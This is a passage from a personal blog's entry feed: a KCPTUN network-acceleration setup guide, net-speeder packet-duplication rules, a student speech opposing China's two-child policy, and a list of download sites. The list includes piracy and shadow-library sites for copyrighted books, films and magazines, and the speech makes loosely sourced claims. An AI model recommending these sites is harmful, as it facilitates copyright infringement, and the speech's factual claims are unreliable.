href="http://blog.sina.com.cn/s/blog_5cc149a20102waom.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_5cc149a20102waom.html</a><br><a href="http://blog.sina.com.cn/s/blog_5f792efc0101fmrg.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_5f792efc0101fmrg.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Recommend a NetBoost : KCPTUN</title>
      <link href="/2016/Recommend-a-NetBoost-KCPTUN/"/>
      <url>/2016/Recommend-a-NetBoost-KCPTUN/</url>
      <content type="html"><![CDATA[<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>Protocol: <a href="https://github.com/skywind3000/kcp" target="_blank" rel="noopener">https://github.com/skywind3000/kcp</a><br>Software: <a href="https://github.com/xtaci/kcptun" target="_blank" rel="noopener">https://github.com/xtaci/kcptun</a></p><p>加速效果极端明显，而且有基本利他性，与多倍发包无关！<br>大力支持！<br>拒绝net-speeder！</p><h1 id="初阶应用"><a href="#初阶应用" class="headerlink" title="初阶应用"></a>初阶应用</h1><h2 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h2><p>以下以Debian8 x64,V20160922为例</p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><h4 id="下载解压-并以root登录"><a href="#下载解压-并以root登录" class="headerlink" title="下载解压 并以root登录"></a>下载解压 并以root登录</h4><pre><code>cd ~wget https://github.com/xtaci/kcptun/releases/download/v20160922/kcptun-linux-amd64-20160922.tar.gztar zxvf ./kcptun-linux-amd64-20160922.tar.gzrm -rf ./client_linux_amd64mkdir ./kcp-servermv ./server_linux_amd64 ./kcpservchmod 700 ./kcpserv</code></pre><h4 id="config-json"><a href="#config-json" class="headerlink" title="config.json"></a>config.json</h4><p>服务器端： </p><pre><code>{    &quot;listen&quot;: &quot;:服务器监听端口&quot;,    &quot;target&quot;: &quot;127.0.0.1:转发端口&quot;,    &quot;key&quot;: &quot;密码&quot;,    &quot;crypt&quot;: &quot;加密方法&quot;,    &quot;mode&quot;: &quot;模式&quot;,    &quot;mtu&quot;: 1350,    &quot;sndwnd&quot;: 自行调整,    &quot;rcvwnd&quot;: 自行调整,    &quot;datashard&quot;: 10,    &quot;parityshard&quot;: 3,    &quot;dscp&quot;: 46,    &quot;nocomp&quot;: true,    &quot;acknodelay&quot;: false,    &quot;nodelay&quot;: 0,    &quot;interval&quot;: 40,    &quot;resend&quot;: 0,    &quot;nc&quot;: 0,    &quot;sockbuf&quot;: 4194304,    &quot;keepalive&quot;: 10}</code></pre><blockquote><p>两端参数必须一致的有:<br>datashard<br>parityshard<br>nocomp<br>key<br>crypt</p></blockquote><blockquote><p>内置模式：<br>响应速度:<br>fast3 &gt; [fast2] &gt; fast &gt; normal &gt; default<br>有效载荷比:<br>default &gt; normal &gt; fast &gt; [fast2] &gt; fast3<br>中间mode参数比较均衡，总之就是越快越浪费带宽，推荐模式 fast2<br>更高级的 手动档 需要理解KCP协议，并通过 隐藏参数 调整，例如:<br>    -mode manual -nodelay 1 -resend 2 -nc 1 -interval 20<br>高丢包率的网络建议采用fast2, 低丢包率的网络，建议采用normal。</p></blockquote><p>客户端：</p><pre><code>{    &quot;localaddr&quot;: &quot;:本地监听端口&quot;,    &quot;remoteaddr&quot;: &quot;服务器地址:监听端口&quot;,    &quot;key&quot;: &quot;密码&quot;,    &quot;crypt&quot;: &quot;加密&quot;,    &quot;mode&quot;: &quot;模式&quot;,    &quot;conn&quot;: 1,    &quot;autoexpire&quot;: 60,    &quot;mtu&quot;: 1350,    &quot;sndwnd&quot;: 自行调整,    &quot;rcvwnd&quot;: 自行调整,    &quot;datashard&quot;: 10,    &quot;parityshard&quot;: 3,    &quot;dscp&quot;: 46,    &quot;nocomp&quot;: true,    &quot;acknodelay&quot;: false,    &quot;nodelay&quot;: 0,    &quot;interval&quot;: 40,    &quot;resend&quot;: 0,    &quot;nc&quot;: 0,    &quot;sockbuf&quot;: 4194304,    &quot;keepalive&quot;: 10}</code></pre><h4 id="启动参数，写入-etc-rc-local"><a href="#启动参数，写入-etc-rc-local" class="headerlink" title="启动参数，写入/etc/rc.local"></a>启动参数，写入/etc/rc.local</h4><p>此处以100M电信光纤为例 </p><p><strong>带$的均为变量，请根据自己的具体信息更改</strong></p><pre><code>nohup /root/kcpserv -c /root/config.json -log /root/kcplog.log &gt;&gt; /dev/null</code></pre><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><h4 id="PC下："><a href="#PC下：" class="headerlink" title="PC下："></a>PC下：</h4><p>创建一个bat，写入：</p><pre><code>client_windows_386.exe -c ./config.json</code></pre><p>将其置于与客户端同一文件夹，每次先启动ss再运行此bat即可。</p><p>后面的各项参数除–rcvwnd –sndwnd外均必须与服务器保持一致！具体的参数配置请参见进阶应用部分。</p><h4 id="SS本地设置"><a href="#SS本地设置" class="headerlink" title="SS本地设置"></a>SS本地设置</h4><p>本地SS客户端设置：</p><blockquote><p>主机： 127.0.0.1<br>端口： kcptun的客户端监听的端口<br>其余的不变</p></blockquote><h1 id="进阶应用"><a href="#进阶应用" class="headerlink" title="进阶应用"></a>进阶应用</h1><h2 id="自行调整的参数"><a href="#自行调整的参数" class="headerlink" title="自行调整的参数"></a>自行调整的参数</h2><p>第一步：同时在两端逐步增大client rcvwnd和server sndwnd;<br>第二步：尝试下载，观察如果带宽利用率（服务器＋客户端两端都要观察）接近物理带宽则停止，否则跳转到第一步。</p><h2 id="手动调整参数"><a href="#手动调整参数" class="headerlink" title="手动调整参数"></a>手动调整参数</h2><blockquote><h1 id="协议配置"><a href="#协议配置" class="headerlink" title="协议配置"></a>协议配置</h1><p>协议默认模式是一个标准的 ARQ，需要通过配置打开各项加速开关：</p><ol><li>工作模式：<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">ikcp_nodelay</span><span class="token punctuation">(</span>ikcpcb <span class="token operator">*</span>kcp<span class="token punctuation">,</span> <span class="token keyword">int</span> nodelay<span class="token punctuation">,</span> <span class="token keyword">int</span> interval<span class="token punctuation">,</span> <span class="token keyword">int</span> resend<span class="token punctuation">,</span> <span class="token keyword">int</span> nc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></blockquote><ul><li>nodelay ：是否启用 nodelay模式，0不启用；1启用。</li><li>interval ：协议内部工作的 interval，单位毫秒，比如 10ms或者 20ms</li><li>resend ：快速重传模式，默认0关闭，可以设置2（2次ACK跨越将会直接重传）</li><li>nc ：是否关闭流控，默认是0代表不关闭，1代表关闭。</li><li>普通模式：`ikcp_nodelay(kcp, 0, 40, 0, 0);</li><li>极速模式： ikcp_nodelay(kcp, 1, 10, 2, 1);</li></ul><blockquote><ol start="2"><li>最大窗口：<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">ikcp_wndsize</span><span class="token punctuation">(</span>ikcpcb <span class="token operator">*</span>kcp<span class="token punctuation">,</span> <span class="token keyword">int</span> sndwnd<span class="token punctuation">,</span> <span class="token keyword">int</span> rcvwnd<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>该调用将会设置协议的最大发送窗口和最大接收窗口大小，默认为32. 这个可以理解为 TCP的 SND_BUF 和 RCV_BUF，只不过单位不一样 SND/RCV_BUF 单位是字节，这个单位是包。</li></ol></blockquote><blockquote><ol start="3"><li>最大传输单元：<br>纯算法协议并不负责探测 MTU，默认 mtu是1400字节，可以使用ikcp_setmtu来设置该值。该值将会影响数据包归并及分片时候的最大传输单元。</li></ol></blockquote><blockquote><ol start="4"><li>最小RTO：<br>不管是 TCP还是 KCP计算 RTO时都有最小 RTO的限制，即便计算出来RTO为40ms，由于默认的 RTO是100ms，协议只有在100ms后才能检测到丢包，快速模式下为30ms，可以手动更改该值：<pre class="line-numbers language-cpp"><code class="language-cpp">kcp<span class="token operator">-</span><span class="token operator">></span>rx_minrto <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></blockquote><blockquote><h1 id="文档索引"><a href="#文档索引" class="headerlink" title="文档索引"></a>文档索引</h1></blockquote><blockquote><p>协议的使用和配置都是很简单的，大部分情况看完上面的内容基本可以使用了。如果你需要进一步进行精细的控制，比如改变 KCP的内存分配器，或者你需要更有效的大规模调度 KCP链接（比如 3500个以上），或者如何更好的同 TCP结合，那么可以继续延伸阅读：</p></blockquote><blockquote><ul><li><a href="https://github.com/skywind3000/kcp/wiki" target="_blank" rel="noopener">Wiki Home</a></li><li><a href="https://github.com/skywind3000/kcp/wiki/KCP-Best-Practice" target="_blank" rel="noopener">KCP 最佳实践</a></li><li><a href="https://github.com/skywind3000/kcp/wiki/Cooperate-With-Tcp-Server" target="_blank" rel="noopener">同现有TCP服务器集成</a></li><li><a href="https://github.com/skywind3000/kcp/wiki/Network-Encryption" target="_blank" rel="noopener">传输数据加密</a></li><li><a href="https://github.com/skywind3000/kcp/wiki/Flow-Control-for-Users" target="_blank" rel="noopener">应用层流量控制</a></li><li><a href="https://github.com/skywind3000/kcp/wiki/KCP-Benchmark" target="_blank" rel="noopener">性能评测</a></li></ul></blockquote><h1 id="Enjoy-It"><a href="#Enjoy-It" class="headerlink" title="Enjoy It!"></a>Enjoy It!</h1>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Caddy Server Manual v0.0.1</title>
      <link href="/2016/Caddy-Server-Manual-v-0-0-1/"/>
      <url>/2016/Caddy-Server-Manual-v-0-0-1/</url>
      <content type="html"><![CDATA[<p>Refer to this :</p><p><a href="https://emiria.io/post/CaddyServer/" target="_blank" rel="noopener">https://emiria.io/post/CaddyServer/</a></p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>School Speech - Two-Child Policy[ENB]</title>
      <link href="/2016/Final-Speech-Conclusion/"/>
      <url>/2016/Final-Speech-Conclusion/</url>
      <content type="html"><![CDATA[<p>We oppose the policy which will allow all couples to have two children from the beginning of 2016.</p><h1 id="Population"><a href="#Population" class="headerlink" title="Population"></a>Population</h1><p>China has the world’s largest population at 1.37 billion. The United Nations projects the number of Chinese people over the age of 65 will jump 85% to 243 million by 2030, up from 131 million this year. The graying population will burden health care and social services, and the world’s second-largest economy will struggle to maintain its growth. The people in China are in extreme poverty, mass amounts of people are suffering and dying because of it. This policy will make this situation more serious. If the population was that large, our Natural Resources would be much smaller and most plants and animals humans use for their everyday diets could wipe out off the face of the Earth.</p><h1 id="Economic-Welfare-and-support"><a href="#Economic-Welfare-and-support" class="headerlink" title="Economic Welfare and support"></a>Economic Welfare and support</h1><p>Meanwhile, couples in areas like Anhui or Shandong who supply much of the labor that powers China’s labor-intensive industries are more likely to have more than one child – but gauging exactly how much material support and through what channels that support should be offered is unclear. The cost of having a second child can be so prohibitive that some couples who would otherwise want to raise two children may not be able to afford to.</p><p>China is sometimes compared with Japan, where economic problems have in part stemmed from demographic trends. Also , The upcoming Lunar New Year, which begins in February, marks the Year of the Sheep in the Chinese Zodiac; “sheep babies” are traditionally believed to be meek and encounter bad luck.</p><h1 id="Costly-to-raise-two-children"><a href="#Costly-to-raise-two-children" class="headerlink" title="Costly to raise two children"></a>Costly to raise two children</h1><p>Raising only a child is already taking up a very significant part of the expenses. aving another baby would bring much more financial obligations for example, it will cost more for their education, housing, and such. Taking care of only one child is very energy-consuming for the two of our parents.</p><h1 id="Relationship-Between-Children-and-Parents"><a href="#Relationship-Between-Children-and-Parents" class="headerlink" title="Relationship Between Children and Parents"></a>Relationship Between Children and Parents</h1><p>It just need to deal with the relationship between the child and parents properly in the first few years and to help them to adapt to the social life in the future. But parents of the family with more than one child need to handle with the competition and conflicts among all family members , so the effort parents spent is doubled. </p><h1 id="Taking-Care-of-parents"><a href="#Taking-Care-of-parents" class="headerlink" title="Taking Care of parents"></a>Taking Care of parents</h1><p>Research shows that parents’ responsibility to take care of children often falls mainly on the one shoulder, and if the child has not been supported by other brothers or sisters , this child is easy to feel frustrated and helpless [2,3]. This negative emotions caused by too much responsibility of taking care of their parents mainly falling on someone’s shoulder, sometimes hinder contact between brothers and sisters, even made primary caregivers to seek help from a legal perspective [4].</p><blockquote><p>[2] Suitor, J. J., &amp; Pillemer, K. (1996). Sources of support and interpersonal stress in the networks of married care- giving daughters: Findings from a 2-year longitudinal study. Journal of Gerontology: Social Science, 51, S297–S306.<br>[3] Ingersoll-Dayton, B., Neal, M. B., Ha, J., &amp; Hammer, L. B. (2003). Redressing inequity in parent care among siblings. Journal of Marriage and Family, 65, 201–212.<br>[4] Strawbridge, W. J., &amp; Wallhagen, M. I. (1991). Impact of family conflict on adult child caregivers. Gerontologist, 31, 770–777.</p></blockquote><h1 id="Psychologic"><a href="#Psychologic" class="headerlink" title="Psychologic"></a>Psychologic</h1><p>Moreover, the sense of the shortage of resources often continue into adulthood, it will affect all aspects of work and marriage of an adult.</p><h1 id="Advantages-of-only-child"><a href="#Advantages-of-only-child" class="headerlink" title="Advantages of only child"></a>Advantages of only child</h1><p>These children, because of their parents’ emotional needs for a more rapid response, have a higher sense of security and became more confident. In addition, comparing with the siblings of the child, the only child is going to have more opportunities to participate in the activities with adults, and will have more verbal communication with parents and other adults, so they mature faster. There’s research shows that one-child families get more resources, such as more toys and books, better kindergartens and schools. They also got better grades in school.</p><h1 id="No-Difference-Comparing-with-the-family-with-more-than-one-child"><a href="#No-Difference-Comparing-with-the-family-with-more-than-one-child" class="headerlink" title="No Difference Comparing with the family with more than one child"></a>No Difference Comparing with the family with more than one child</h1><p>US researchers’ study published on “Marriage and Family”  in 1987 shows that there’s no significant differences in sixteen personality traits between “the family with only one child” and “the family with more than one child”, including leadership, maturity, extraversion , the degree of social integration, popularity, generosity, cooperation, flexibility, emotional stability. Moreover, this study also found that the only child develops more fast than the child in the family with many children. For example, they are on the higher level of achievement motivation and with higher IQ . In addition, these children also show a higher level of self-esteem.</p><h1 id="Women’s-Rights"><a href="#Women’s-Rights" class="headerlink" title="Women’s Rights"></a>Women’s Rights</h1><p>I have seen a lot of women’s rights arguments being thrown around. I am a strong supporter of feminism, but I ask you this, how can you argue that the unborn children should be treated equally to the already born children who are suffering due to population. How can you say that the children who are unborn have the equal rights to free education and healthcare than the already born children who are living in such poverty they can not afford this.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Each birth is less space, less food, and a depletion of quality of life. It’s easy to argue that this policy should be abolished. We are in China Mainland, which can be one of the most crowded areas in the world. At this time how to ensure the old can have a quiet and comfortable life at an old age, making them not to worry about their life, it will be our last but the most difficult battle.</p><h1 id="C-Changer-‘s-Lead-in"><a href="#C-Changer-‘s-Lead-in" class="headerlink" title="C.Changer ‘s Lead in"></a>C.Changer ‘s Lead in</h1><p>Since the two-child policy was published, the controversy about whether it should be released has never stopped. We strongly oppose two-child policy. China now has a lot of problems, but most of the problems are caused by the large population base. We are developing the market economy, which means that we will have a capital accumulation and extra populations. With a large population born in 1960’s, China’s population cannot be ignored. Experts are trying to use the two-child policy to solve the problems, but it just does not help. They think it may help solving the aging of population, ecological pollutions, waste of resources and many other problems which were mostly caused by the large populations of China.<br>But the two-child policy is only making it worse. On the one hand, if more children are born in the society, government must pay more to deal with the educational expenses, which means a lot of money. Severe employment situation will be even worse, a lot of people can’t get a job even they don’t like it. National social spending will continue to rise. Downward trend in the economy will cause more unemployed populations. On the other hand, life of the old cannot be guaranteed because of the huge burden on national finances. Then the population growth inertia will produce extra populations, which means more waste of resources and more ecological pollutions. Gradually, food and fresh water resources will reduce. More children will be born to solve the problems. If it occurs again and again, China will be worn down sooner or later.</p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Net-Speeder Shell Script[弃用]</title>
      <link href="/2016/Net-Speeder-Shell-Script/"/>
      <url>/2016/Net-Speeder-Shell-Script/</url>
      <content type="html"><![CDATA[<h1 id="Net-Speeder-启动相关规则"><a href="#Net-Speeder-启动相关规则" class="headerlink" title="Net-Speeder 启动相关规则"></a>Net-Speeder 启动相关规则</h1><p>net-speeder 的使用方法为<br>./net_speeder 网卡名 加速规则 </p><p>其中加速规则采用 bpf 规则，一般常用下面规则来启动<br>./net_speeder venet0 “ip”<br>./net_speeder venet0 “tcp” </p><p>有 V 友讨论过，这样可能存在安全隐患，这个帖子里用 iptables 来处理，但总觉得未从根源来解决 </p><p>其实可以用 bpf 规则使之只复制发出的包，下面 3 条规则供参考<br>复制本机发出的 tcp 包：./net_speeder venet0 “tcp and src host 本机 IP 地址”<br>复制本机某个端口发出的 tcp 包：./net_speeder venet0 “tcp src port 端口号 and src host 本机 IP 地址”<br>复制本机多个端口发出的 tcp 包：./net_speeder venet0 “(tcp src port 端口号 1 or 端口号 2 or 端口号 3) and src host 本机 IP 地址”<br>（本机 IP 地址不要用 127.0.0.1 ，可用 ifconfig | grep “inet addr” | cut -f 2 -d “:” | cut -f 1 -d “ “ | grep -v ‘127.0.0.‘来获取）<br>复制本机发出的 tcp 和 udp 包：./net_speeder venet0 “(tcp or udp) and src host 本机 IP 地址”</p><p>语法参考<br><a href="http://biot.com/capstats/bpf.html" target="_blank" rel="noopener">http://biot.com/capstats/bpf.html</a><br><a href="http://blog.csdn.net/jk110333/article/details/8675547" target="_blank" rel="noopener">http://blog.csdn.net/jk110333/article/details/8675547</a><br><a href="https://www.v2ex.com/t/248273" target="_blank" rel="noopener">https://www.v2ex.com/t/248273</a> </p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Network Source Collection[CN]</title>
      <link href="/2016/Network-Source-Collection/"/>
      <url>/2016/Network-Source-Collection/</url>
      <content type="html"><![CDATA[<p>一、找资源利器</p><p>去转盘网:<a href="http://www.quzhuanpan.com/" target="_blank" rel="noopener">http://www.quzhuanpan.com/</a></p><p>西林街： <a href="http://www.xilinjie.com/" target="_blank" rel="noopener">http://www.xilinjie.com/</a></p><p>EV 搜索： <a href="http://www.evsou.com/" target="_blank" rel="noopener">http://www.evsou.com/</a></p><p>找文件： <a href="http://www.zhaofile.com/" target="_blank" rel="noopener">http://www.zhaofile.com/</a></p><p>胖次： <a href="http://www.panc.cc/" target="_blank" rel="noopener">http://www.panc.cc/</a></p><p>呆木瓜： <a href="http://www.daimugua.com/" target="_blank" rel="noopener">http://www.daimugua.com/</a></p><p>爱挖盘： <a href="http://www.iwapan.com/" target="_blank" rel="noopener">http://www.iwapan.com/</a></p><p>二、外文书籍（文献）下载网站</p><p>Library Genesis ： <a href="http://gen.lib.rus.ec/" target="_blank" rel="noopener">http://gen.lib.rus.ec/</a></p><p>Book ZZ ： <a href="http://bookzz.org/" target="_blank" rel="noopener">http://bookzz.org/</a></p><p>Free-Ebooks ： <a href="http://www.free-ebooks.net/" target="_blank" rel="noopener">http://www.free-ebooks.net/</a></p><p>Bookboon ： <a href="http://bookboon.com/en" target="_blank" rel="noopener">http://bookboon.com/en</a></p><p>ManyBooks ： <a href="http://manybooks.net/" target="_blank" rel="noopener">http://manybooks.net/</a></p><p>SnipFiles ： <a href="http://www.snipfiles.com/" target="_blank" rel="noopener">http://www.snipfiles.com/</a></p><p>Open Library ： <a href="https://openlibrary.org/" target="_blank" rel="noopener">https://openlibrary.org/</a></p><p>Bookyards ： <a href="http://www.bookyards.com/" target="_blank" rel="noopener">http://www.bookyards.com/</a></p><p>三、中文书籍下载网站</p><p>书林网： <a href="http://www.booksforest.com/" target="_blank" rel="noopener">http://www.booksforest.com/</a></p><p>钱氏藏书： <a href="http://qscs.haotui.com/?fromuid=272" target="_blank" rel="noopener">http://qscs.haotui.com/?fromuid=272</a></p><p>大熊图书馆： <a href="http://dxlibrary.haotui.com/bbs.php" target="_blank" rel="noopener">http://dxlibrary.haotui.com/bbs.php</a></p><p>大众图书馆： <a href="http://dztsg.info/forum.php" target="_blank" rel="noopener">http://dztsg.info/forum.php</a></p><p>读远： <a href="http://www.readfar.com/" target="_blank" rel="noopener">http://www.readfar.com/</a></p><p>Bucee 杂志馆： <a href="http://bucee.net/" target="_blank" rel="noopener">http://bucee.net/</a></p><p>汉川草庐： <a href="http://www.sidneyluo.net/index.html" target="_blank" rel="noopener">http://www.sidneyluo.net/index.html</a></p><p>四、非常强大的翻译平台</p><p>CNKI 翻译助手： <a href="http://dict.cnki.net/" target="_blank" rel="noopener">http://dict.cnki.net/</a></p><p>句酷： <a href="http://www.jukuu.com/" target="_blank" rel="noopener">http://www.jukuu.com/</a></p><p>词都： <a href="http://www.dictall.com/" target="_blank" rel="noopener">http://www.dictall.com/</a></p><p>LINE Dictionary ： <a href="http://ce.linedict.com/dict.html#/cnen/" target="_blank" rel="noopener">http://ce.linedict.com/dict.html#/cnen/</a></p><p>Glosbe ： <a href="https://glosbe.com/" target="_blank" rel="noopener">https://glosbe.com/</a></p><p>五、神站系列</p><p>大软坊： <a href="http://app.hustonline.net/major" target="_blank" rel="noopener">http://app.hustonline.net/major</a></p><p>香当网： <a href="http://www.xiangdang.net/" target="_blank" rel="noopener">http://www.xiangdang.net/</a></p><p>Smallpdf ： <a href="http://smallpdf.com/" target="_blank" rel="noopener">http://smallpdf.com/</a></p><p>MSDN ： <a href="http://www.itellyou.cn/" target="_blank" rel="noopener">http://www.itellyou.cn/</a></p><p>六、考研资料相关网站</p><p>考研圈： <a href="http://www.zhuansoo.com/vbar/c/vc.html?id=19" target="_blank" rel="noopener">http://www.zhuansoo.com/vbar/c/vc.html?id=19</a></p><p>考试点社区:<a href="http://bbs.kaoshidian.com/resource" target="_blank" rel="noopener">http://bbs.kaoshidian.com/resource</a></p><p>考研论坛： <a href="http://download.bbs.kaoyan.com/" target="_blank" rel="noopener">http://download.bbs.kaoyan.com/</a></p><p>小木虫论坛： <a href="http://emuch.net/bbs/index.php" target="_blank" rel="noopener">http://emuch.net/bbs/index.php</a></p><p>传媒人网： <a href="http://www.chuanmeiren.cn/bbs/" target="_blank" rel="noopener">http://www.chuanmeiren.cn/bbs/</a></p><p>七、动漫资源网站</p><p>Animation World Network ： <a href="http://www.awn.com/" target="_blank" rel="noopener">http://www.awn.com/</a></p><p>卡通酿造： <a href="http://www.cartoonbrew.com/" target="_blank" rel="noopener">http://www.cartoonbrew.com/</a></p><p>皮克斯帝国： <a href="http://pixarempire.com/" target="_blank" rel="noopener">http://pixarempire.com/</a></p><p>动漫花园： <a href="http://share.dmhy.org" target="_blank" rel="noopener">http://share.dmhy.org</a></p><p>漫游 BT ： <a href="http://share.popgo.org" target="_blank" rel="noopener">http://share.popgo.org</a></p><p>简单动漫： <a href="http://www.36dm.com/" target="_blank" rel="noopener">http://www.36dm.com/</a></p><p>漫画书： <a href="http://manhuashu.net/" target="_blank" rel="noopener">http://manhuashu.net/</a></p><p>旋风动漫： <a href="http://bt.xfsub.com/" target="_blank" rel="noopener">http://bt.xfsub.com/</a></p><p>八、高清电影资源网站</p><p>高清控联盟： <a href="http://www.gaoqingkong.com/" target="_blank" rel="noopener">http://www.gaoqingkong.com/</a></p><p>藏云阁高清网： <a href="http://www.cangyunge.com/" target="_blank" rel="noopener">http://www.cangyunge.com/</a></p><p>电影王国： <a href="http://www.moviewg.com/" target="_blank" rel="noopener">http://www.moviewg.com/</a></p><p>蓝影网： <a href="http://www.lanyingwang.com/" target="_blank" rel="noopener">http://www.lanyingwang.com/</a></p><p> 22 个电影资源网站：</p><p>1、蓝影网  <a href="http://www.lanyingwang.com/" target="_blank" rel="noopener">http://www.lanyingwang.com/</a></p><p>2、电影天堂  <a href="http://www.dy2018.com/" target="_blank" rel="noopener">http://www.dy2018.com/</a></p><p>3、电影小二网  <a href="http://movie002.com/" target="_blank" rel="noopener">http://movie002.com/</a></p><p>4、小浣熊  <a href="http://www.xiaohx.com/" target="_blank" rel="noopener">http://www.xiaohx.com/</a></p><p>5、飘花电影网  <a href="http://www.piaohua.com/" target="_blank" rel="noopener">http://www.piaohua.com/</a></p><p>6、BT天堂  <a href="http://www.piaohua.com/" target="_blank" rel="noopener">http://www.piaohua.com/</a></p><p>7、乐搜  <a href="http://www.lesou.org/" target="_blank" rel="noopener">http://www.lesou.org/</a></p><p>8、搬运工  <a href="http://banyungong.net/" target="_blank" rel="noopener">http://banyungong.net/</a></p><p>9、方圈儿  <a href="http://www.fangquaner.com/rbindex.php" target="_blank" rel="noopener">http://www.fangquaner.com/rbindex.php</a></p><p>10、6V电影网  <a href="http://www.6vhao.com/" target="_blank" rel="noopener">http://www.6vhao.com/</a></p><p>11、80s电影网  <a href="http://www.k5.cc/" target="_blank" rel="noopener">http://www.k5.cc/</a></p><p>12、炫电影  <a href="http://www.xuandy.com/" target="_blank" rel="noopener">http://www.xuandy.com/</a></p><p>13、老调网  <a href="http://www.bestxl.com/" target="_blank" rel="noopener">http://www.bestxl.com/</a></p><p>14、泡饭影视  <a href="http://www.chapaofan.com/" target="_blank" rel="noopener">http://www.chapaofan.com/</a></p><p>15、SimpleCD <a href="http://simplecd.me/" target="_blank" rel="noopener">http://simplecd.me/</a></p><p>16、天天美剧  <a href="http://www.ttmeiju.com/" target="_blank" rel="noopener">http://www.ttmeiju.com/</a></p><p>17、电影FM  <a href="http://dianying.fm/" target="_blank" rel="noopener">http://dianying.fm/</a></p><p>19、MP4吧  <a href="http://www.mp4ba.com/" target="_blank" rel="noopener">http://www.mp4ba.com/</a></p><p>20、片仓  <a href="http://www.piancang.com/" target="_blank" rel="noopener">http://www.piancang.com/</a></p><p>21、牛B四十  <a href="http://www.nb40.com/" target="_blank" rel="noopener">http://www.nb40.com/</a></p><p>22、迅播影院  <a href="http://www.2tu.cc/" target="_blank" rel="noopener">http://www.2tu.cc/</a></p><p>6个BT种子搜索引擎</p><p>1、BT搜搜  <a href="http://www.btsoso.me/" target="_blank" rel="noopener">http://www.btsoso.me/</a><br>2、BTbook  <a href="http://www.btbook.net/" target="_blank" rel="noopener">http://www.btbook.net/</a><br>3、Runbt  <a href="http://www.runbt.com/" target="_blank" rel="noopener">http://www.runbt.com/</a><br>4、Diggbt  <a href="http://www.diggbt.com/" target="_blank" rel="noopener">http://www.diggbt.com/</a><br>5、BT樱桃  <a href="http://www.btcherry.com/" target="_blank" rel="noopener">http://www.btcherry.com/</a><br>6、BTdigg  <a href="https://btdigg.org/" target="_blank" rel="noopener">https://btdigg.org/</a></p><p>九、六个纪录片精品网站</p><p>Ary Heaven ： <a href="http://documentaryheaven.com/" target="_blank" rel="noopener">http://documentaryheaven.com/</a></p><p>Free DocumentAries ： <a href="http://freedocumentaries.org/" target="_blank" rel="noopener">http://freedocumentaries.org/</a></p><p>Top DocumentaryFilm ： <a href="http://topdocumentaryfilms.com/" target="_blank" rel="noopener">http://topdocumentaryfilms.com/</a></p><p>District 7 Media:<a href="http://www.district7media.net/main/" target="_blank" rel="noopener">http://www.district7media.net/main/</a></p><p>Citizen 4Film:<a href="https://citizenfourfilm.com/" target="_blank" rel="noopener">https://citizenfourfilm.com/</a></p><p>Documentary ： <a href="http://documentaryaddict.com/" target="_blank" rel="noopener">http://documentaryaddict.com/</a></p><p>十、下载国内外杂志的资源网站</p><p>高清杂志网： <a href="http://www.gqzzw.com/" target="_blank" rel="noopener">http://www.gqzzw.com/</a></p><p>PDF magazines ： <a href="http://pdfmagazines.org/" target="_blank" rel="noopener">http://pdfmagazines.org/</a></p><p>PDF-giant ： <a href="http://pdf-giant.com/" target="_blank" rel="noopener">http://pdf-giant.com/</a></p><p>PDF 之家： <a href="http://www.pdfzj.com/" target="_blank" rel="noopener">http://www.pdfzj.com/</a></p><p>十月杂志网： <a href="http://shiyue.me/" target="_blank" rel="noopener">http://shiyue.me/</a></p><p>十一、有声读物网站</p><p>天方听书 <a href="http://www.tingbook.com/" target="_blank" rel="noopener">http://www.tingbook.com/</a></p><p>静雅思听 <a href="http://www.justing.com.cn/" target="_blank" rel="noopener">http://www.justing.com.cn/</a></p><p>书喇叭 <a href="http://shulaba.com/" target="_blank" rel="noopener">http://shulaba.com/</a></p><p>爱听网 <a href="http://www.aitingwang.com/" target="_blank" rel="noopener">http://www.aitingwang.com/</a></p><p>酷听网 <a href="http://www.kting.cn/" target="_blank" rel="noopener">http://www.kting.cn/</a></p><p>家常读书 <a href="http://www.jiachangdushu.com/portal.php" target="_blank" rel="noopener">http://www.jiachangdushu.com/portal.php</a></p><p>十二、旧书交易类网站</p><p>孔夫子旧书网 <a href="http://shop.kongfz.com/" target="_blank" rel="noopener">http://shop.kongfz.com/</a></p><p>布衣书局 <a href="http://www.booyee.com.cn/index.jsp" target="_blank" rel="noopener">http://www.booyee.com.cn/index.jsp</a></p><p>有路网 <a href="http://www.youlu.net/" target="_blank" rel="noopener">http://www.youlu.net/</a></p><p>中国旧书网 <a href="http://www.jiushu.cn/" target="_blank" rel="noopener">http://www.jiushu.cn/</a></p><p>天下旧书网 <a href="http://www.jiushu.net/" target="_blank" rel="noopener">http://www.jiushu.net/</a></p><p>十三、免费音效资源类网站</p><p>闪吧音效库 <a href="http://www.flash8.net/download.shtml" target="_blank" rel="noopener">http://www.flash8.net/download.shtml</a></p><p>中国素材网音效库 <a href="http://www.sucai.com/duomeiti/yx/" target="_blank" rel="noopener">http://www.sucai.com/duomeiti/yx/</a></p><p>日本的音效库 <a href="http://koukaongen.com/" target="_blank" rel="noopener">http://koukaongen.com/</a></p><p>站长素材-音效 <a 